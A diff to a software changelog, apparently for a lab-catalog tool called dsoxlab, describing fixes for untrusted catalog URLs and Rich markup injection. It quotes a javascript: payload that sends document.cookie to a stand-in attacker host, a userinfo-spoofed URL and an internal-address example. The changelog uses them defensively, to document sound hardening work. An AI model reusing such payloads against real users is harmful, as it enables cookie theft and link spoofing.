@@ -111,9 +111,82 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
   Measured on a real catalog: **179 lines exported out of 179 in the database**,
   where `scores` would have shown twenty.
+- **One URL policy for every value a catalog declares** (issue #273). A catalog
+  is untrusted input — `dsoxlab catalog add <url>` clones an arbitrary git
+  repository — and its URLs were being treated as content. Reproduced before
+  being fixed, with a lab declaring
+  `doc_url: "javascript:fetch('https://attaquant.test/'+document.cookie)"`:
+  `dsoxlab guide --print` printed the value as-is, campaign parameters appended,
+  and without `--print` it reached `webbrowser.open()`.
+
+  `validate-structure` does check that field. It is not a security barrier: it
+  is neither automatic nor required before using a catalog. The check is now
+  replayed **at the point of use**, by a single primitive
+  (`src/dsoxlab/security/urls.py`) that really parses the URL, requires a
+  hostname, refuses `user:password@`, refuses control characters, and refuses
+  every scheme outside its policy — `javascript:`, `data:`, `file:`, `ftp:`,
+  `ssh:`, and any protocol handler installed on the machine.
+
+  Two policies, declared rather than reimplemented: documentation and issue URLs
+  accept `http` and `https`, an evidence portal will accept `https` only. One
+  parser, so the permissive one cannot quietly become the rule. `doc_url`,
+  `repo.issues_url` and the URL derived from a catalog's git remote all go
+  through it, and #269/#270 will reuse it rather than write a third check.
+
+  **No network probing.** Nothing resolves a name, opens a connection or follows
+  a redirect to decide whether a URL is acceptable — otherwise a catalog
+  declaring `doc_url: http://192.168.1.1/admin` would make your machine, or the
+  CI runner, issue that request. `validate-structure --check-urls` remains what
+  it was: a deliberate, explicit network check.
+
+  The model is written once, in [docs/security.md](./docs/security.md), including
+  what it does **not** protect against — a lab's playbooks and tests run with
+  your privileges, and no amount of URL validation changes that.
+
+### Changed
+
+- **`dsoxlab guide` no longer opens a browser on its own** (issue #273). A
+  syntactically safe URL is not an approved destination: the address comes from
+  the catalog, and the decision to go there is the reader's. The command prints
+  the URL, and `--open` opens it. `--print` keeps working and now means the same
+  thing as the default, which is why it stays: scripts use it.
+
+  `support --issue` was already asking before opening, and keeps doing so, now
+  with the destination validated by the same policy.
 
 ### Fixed
 
+- **One character in a catalog made the whole catalog unviewable** (issue #273).
+  Measured before the fix, on a lab declaring
+  `title: "Titre [red]hostile[/red] et [/] non apparié"`:
+
+  ```text
+  $ dsoxlab list-labs
+  MarkupError: closing tag '[/]' at position 28 has nothing to close
+  $ dsoxlab show casse
+  MarkupError: closing tag '[/]' at position 113 has nothing to close
+  ```
+
+  Both commands exited with a Python traceback. Contract values were being
+  interpolated into Rich markup, so a catalog could also colour what it liked,
+  place a `[link=…]` hyperlink wherever it liked — the target of one is not what
+  the eye reads — or rename the terminal window with an `OSC` sequence.
+
+  Values from the contract are now escaped where they are rendered, control
+  characters and direction overrides are replaced, and `show` prints the guide
+  address in plain text instead of a clickable link. The console also carries a
+  net: markup it cannot parse is rendered literally rather than raised. Both
+  matter — the net covers the display points nobody has thought to protect yet,
+  which is precisely where the next defect will be.
+
+  Found this way, after the first fix: the section title from `meta.yml`,
+  displayed by `progress`, was still interpreted.
+- **`repo.issues_url` was checked by prefix** (issue #273). A
+  `startswith(("http://", "https://"))` would have accepted
+  `https://vrai-site.test@attaquant.test/issues`, where the eye reads the first
+  name and the browser goes to the second. It now goes through the URL policy,
+  and a rejected value falls back to the git remote as before — a diagnostic
+  report is not lost because a catalog mis-declared where to send it.
 - **A network outage was reported as a lab defect, and the same URL was
   requested once per lab** (issue #224). `validate-structure --check-urls`
   turned a green CI red on four guides declared unreachable; all four answered
